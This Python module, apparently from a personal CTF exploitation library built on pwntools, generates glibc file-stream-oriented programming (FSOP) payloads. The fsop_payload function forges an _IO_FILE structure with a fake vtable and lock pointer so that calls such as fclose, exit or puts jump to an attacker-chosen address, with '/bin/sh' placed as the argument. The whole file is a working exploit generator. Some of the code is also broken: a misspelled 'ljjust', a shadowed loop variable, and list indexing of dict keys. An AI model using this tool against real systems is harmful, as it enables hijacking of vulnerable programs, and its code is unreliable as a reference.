from pwn import *
# from .iofile_struct import *
from mypwn.mypwnlib.Exception.myExcept import *
from mypwn.mypwnlib.pwnfunc.pwnfunc import myprint
# def pack32_num(num):
#     return p32(num)

# def pack64_num(num):
#     return p64(num)

# def pack_num(num):
#     try:
#         if isinstance(num,int):
#             if context.arch=='i386':
#                 return pack32_num(num)
#             elif context.arch=='amd64':
#                 return pack64_num(num)
#             raise contextArchError('\n\narch not i386 and amd64\n\n')
#         else:
#             raise argMustbeInt('\n\nargument must be int\n\n')
#     except contextArchError as except0:
#         myprint(except0)
#         quit()  
#     except argMustbeInt as except1:
#         myprint(except1)
#         quit()

# def ret_init_list(len):
#     return [pack_num(0)]*len
          

def ret_overflow_dict(iofile_addr,addr_payload):
    """
    {addr:payload}
    """
    addr_list=addr_payload.keys()
    payload_list=addr_payload.values()
    if addr_list[0]<iofile_addr:
        myprint('*******************************')
        myprint("offset to change error")
        quit()
    ret_idx_list=[]
    ret_payload_list=[]
    mode_bit=4
    if context.arch=='amd64':
        mode_bit=8
    for i in range(len(addr_list)):
        addr_beg=addr_list[i]-addr_list[i]%mode_bit
        align_left=addr_list[i]-addr_beg
        addr_end=addr_list[i]+(mode_bit-addr_list[i]%mode_bit)
        align_right=addr_end-addr_list[i]-1

        first_idx=(addr_list[i]-iofile_addr)/mode_bit
        idx_num=(addr_end-addr_beg)/mode_bit
        payload_list[i]='\x00'*align_left+payload_list[i]+'\x00'*align_right
        for i in range(idx_num):
            ret_idx_list.append(first_idx+i)
            ret_payload_list.append((payload_list[i])[mode_bit*i:mode_bit*(i+1)])
    return dict(zip(ret_idx_list,ret_payload_list))

def fsop_payload(iofile_addr,writes,ptr_to_zero=0x0,addr_payload={},use_onegadget=0,sh_str='/bin/sh\x00'):
    """
        fsop_payload(iofile_addr,writes={},ptr_to_zero)
    """
    mode_bit=4
    if context.arch=='amd64':
        mode_bit=8

    finish_idx=2
    overflow_idx=3
    xsputn_idx=7
    xsgetn_idx=8
    close_idx=17
    write_idx=15
    seek_idx=16

    mode_idx=0
    write_ptr_idx=0
    write_base_idx=0
    use_overflow=0


    funcptr_idx=0

    keys=writes.keys()
    values=writes.values()

    idx_can_not_use_list=[]
    idx_be_change=[]
    change_dict={}
    if len(addr_payload)==0:
        vtable_ptr=iofile_addr
    else:
        change_dict=ret_overflow_dict(iofile_addr,addr_payload)
        idx_be_change=change_dict.keys()
        idx_can_not_use_list=idx_be_change[:]

    vtable_ptr_idx=0
    lock_ptr_idx=0
    flags2_idx=0

    if context.arch=='i386':
        vtable_ptr_idx=37 
        lock_ptr_idx=18
        save_base_idx=9
        vtable_offset_idx=17
        flags2_idx=15

    elif context.arch=='amd64':
        vtable_ptr_idx=27
        lock_ptr_idx=17
        save_base_idx=9
        vtable_offset_idx=16
        flags2_idx=14


    print('===================================')
    print('idx_be_change',idx_be_change)
    print('idx_can_not_use_list',idx_can_not_use_list)
    print('change_dict',change_dict)
    print('===================================')

    # can not overflow
    if vtable_ptr_idx not in idx_can_not_use_list and lock_ptr_idx not in idx_can_not_use_list:
        idx_can_not_use_list.append(vtable_ptr_idx)
        idx_can_not_use_list.append(lock_ptr_idx)
        idx_can_not_use_list.append(vtable_offset_idx)
    else:
        myprint('*****************************')
        myprint('Error: lock_ptr or vtable_ptr maybe cover')
        quit()


    print('===================================')
    print('idx_be_change',idx_be_change)
    print('idx_can_not_use_list',idx_can_not_use_list)
    print('change_dict',change_dict)
    print('===================================')
    print(sh_str)
    # sh_str idx
    if use_onegadget and (keys[0]=='fclose' or keys[0]=='close'):
        sh_str='\x00'*8
        print('here')
    if len(sh_str):
        sh_max_idx=int(len(sh_str)/mode_bit)
        if sh_max_idx%mode_bit!=0:
            sh_max_idx+=1
        if context.arch=='i386':
            for i in range(sh_max_idx):
                if i not in idx_can_not_use_list:
                    idx_can_not_use_list.append(i)
        elif context.arch=='amd64':
            for i in range(sh_max_idx):
                if i not in idx_can_not_use_list:
                    idx_can_not_use_list.append(i)
    if len(sh_str)<8:
        ret_string=sh_str.ljjust(8,'\x00')
    elif len(sh_str)>=8:
        ret_string=sh_str
    ## then decide use what funcptr_idx
    print('===================================')
    print('idx_be_change',idx_be_change)
    print('idx_can_not_use_list',idx_can_not_use_list)
    print('change_dict',change_dict)
    print('===================================')

    if keys[0]!='fclose' and keys[0]!='close':
        try:
            if keys[0]=='finish' or keys[0]=='__finish':
                funcptr_idx=finish_idx
            elif keys[0]=='overflow' or keys[0]=='__overflow' or keys[0]=='exit' or keys[0]=='abort':
                use_overflow=1
                if context.arch=='i386':
                    mode_idx=26
                    write_base_idx=5
                    write_ptr_idx=6
                elif context.arch=='amd64':
                    mode_idx=24
                    write_base_idx=4
                    write_ptr_idx=5
                funcptr_idx=overflow_idx
            elif keys[0]=='fwrite' or keys[0]=='puts' or keys[0]=='write' or keys[0]=='xsputn' or keys[0]=='__xsputn':
                funcptr_idx=xsputn_idx
            elif keys[0]=='fread' or keys[0]=='read' or keys[0]=='xsgetn' or keys[0]=='__xsgetn':
                funcptr_idx=xsgetn_idx
            else:
                raise argError("\n\nthe second argument error\n\n")
        except argError as except0:
            myprint("writes={}".format("'read|write|finish|overflow|close':addr"))
            myprint(except0)
            quit()
        # ***************************************
        # 
    else:
        # here have some problem not finish
        flags=u64(ret_string[0:8])
        if flags & 0x2000:
            if (flags & 0x8)==0 and (flags & 0x800)!=0:
                # use seek or write
                # when use /bin/sh\x00 will not be here
                # so not support this condition.
                myprint('******************************')
                myprint("the script not finish!")
                myprint("try to finish it from _IO_do_flush in _IO_new_file_close_it")
                quit()
            else:
                if save_base_idx not in idx_can_not_use_list:
                    idx_can_not_use_list.append(save_base_idx)
                if (flags2_idx not in idx_can_not_use_list) and (flags2_idx not in idx_be_change):
                    # flags_2 can be 0, use close
                    myprint("********************************")
                    myprint("Attention to set (flags2 & _IO_FLAGS2_NOCLOSE==0)")
                    idx_can_not_use_list.append(flags2_idx)
                    funcptr_idx=close_idx

                # flags2 in idx_be_change and may be in idx_can_not_use_list
                elif flags2_idx in idx_be_change:
                    # control flags_2 to use close
                    flags2_value=change_dict.get(flags2_idx)
                    flags2=u32(flags2_value[0:4])
                    if context.arch=='amd64':
                        flags2=u32(flags2_value[4:8])
                    if (flags2 &  32)==0:
                        funcptr_idx=close_idx
                    else:
                        myprint("*********************************")
                        myprint("Attention: must use onegadget!")
                        if use_onegadget==0:
                            quit()
                        funcptr_idx=finish_idx
                # flags2 be zero             
                elif flags2_idx in idx_can_not_use_list:
                    funcptr_idx=close_idx            
                else:
                    myprint("*********************************")
                    myprint("Attention: must use onegadget!")
                    if use_onegadget!=0:
                        quit()
                    funcptr_idx=finish_idx
        
        else:
            funcptr_idx=finish_idx
    ## up decide funcptr_is what. and where can not save something

    if use_overflow:
        idx_can_not_use_list.append(mode_idx)
        idx_can_not_use_list.append(write_base_idx)
        idx_can_not_use_list.append(write_ptr_idx)
    ## ====================================================================
    ## find lock_idx and vtable_funcptr_idx
    max_idx=vtable_ptr_idx
    lock_idx=0
    vtable_funcptr_idx=0
    # myprint('vtable_ptr_idx',hex(max_idx))
    # myprint('can_not_use',idx_can_not_use_list)
    for i in range(max_idx):
        if i not in idx_can_not_use_list:
            if vtable_funcptr_idx==0:
                vtable_funcptr_idx=i
                continue
            if lock_idx==0:
                if context.arch=='i386':
                    if (i+1) not in (idx_can_not_use_list) and ((i+2) not in idx_can_not_use_list):
                        lock_idx=i
                        break
                elif context.arch=='amd64':
                    if (i+1) not in (idx_can_not_use_list):
                        lock_idx=i
                        break
        if i==max_idx-1:
            myprint("can not find position to lock_idx and vtable_funcptr_idx")
            quit()

    # if 

    vtable_ptr=iofile_addr+mode_bit*(vtable_funcptr_idx-funcptr_idx)
    if ptr_to_zero!=0:
        lock_ptr=ptr_to_zero
    else:
        lock_ptr=iofile_addr+mode_bit*lock_idx

    idx_must_control_to_not_zero=[
        lock_idx,lock_ptr_idx,
        vtable_ptr_idx,vtable_funcptr_idx,
    ]
    if use_overflow:
        idx_must_control_to_not_zero.append(write_ptr_idx)

    idx_must_control_to_not_zero+=idx_be_change
    # myprint('========================================')
    # myprint(idx_can_not_use_list)
    # myprint(idx_must_control_to_not_zero)
    # myprint('=====================================')
    try:
        if context.arch=='amd64':
            for i in range(len(idx_must_control_to_not_zero)):
                min_num=min(idx_must_control_to_not_zero)
                min_num_index=idx_must_control_to_not_zero.index(min_num)
                del(idx_must_control_to_not_zero[min_num_index])
                ret_string=ret_string.ljust(mode_bit*min_num,'\x00')

                if min_num in idx_be_change:
                    ret_string+=change_dict.get(min_num)
                else:
                    if use_overflow and min_num==write_ptr_idx:
                        ret_string+=p64(1)
                    elif min_num==lock_ptr_idx:
                        ret_string+=p64(lock_ptr)
                    elif min_num==vtable_ptr_idx:
                        ret_string+=p64(vtable_ptr)
                    elif min_num==vtable_funcptr_idx:
                        ret_string+=p64(values[0])
                    else:
                        ret_string+=p64(0)



        elif context.arch=='i386':
            for i in range(len(idx_must_control_to_not_zero)):
                min_num=min(idx_must_control_to_not_zero)
                min_num_index=idx_must_control_to_not_zero.index(min_num)
                del(idx_must_control_to_not_zero[min_num_index])

                ret_string=ret_string.ljust(mode_bit*min_num,'\x00')

                if min_num in idx_be_change:
                    ret_string+=change_dict.get(min_num)

                elif min_num==lock_ptr_idx:
                    ret_string+=p32(lock_ptr)
                elif min_num==vtable_ptr_idx:
                    ret_string+=p32(vtable_ptr)
                elif min_num==vtable_funcptr_idx:
                    ret_string+=p32(values[0])
                else:
                    ret_string+=p32(0)

        else:
            raise contextArchError("\n\ncontext.arch must be amd64 or i386")
        return ret_string
    except contextArchError as except1:
        myprint(except1)
        quit()